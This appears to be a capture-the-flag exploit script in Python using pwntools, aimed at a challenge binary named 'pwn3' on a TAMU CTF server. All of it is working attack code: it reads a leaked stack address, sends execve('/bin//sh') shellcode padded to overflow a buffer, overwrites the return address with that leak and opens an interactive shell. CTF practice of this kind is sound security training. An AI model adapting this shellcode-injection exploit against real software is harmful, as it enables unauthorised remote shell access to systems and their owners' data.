from pwn import *

DEBUG = False

if DEBUG:
	r = process('./pwn3')
	context.log_level = 'debug'
else:
	r = remote('pwn.ctf.tamu.edu',4323)

sh = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

r.recvuntil('0x')
stack = int(r.recv(8),16)
r.recvuntil('? ')

payload = ''
payload += sh + 'a' * (242-len(sh))
payload += p32(stack)

r.sendline(payload)
r.interactive()
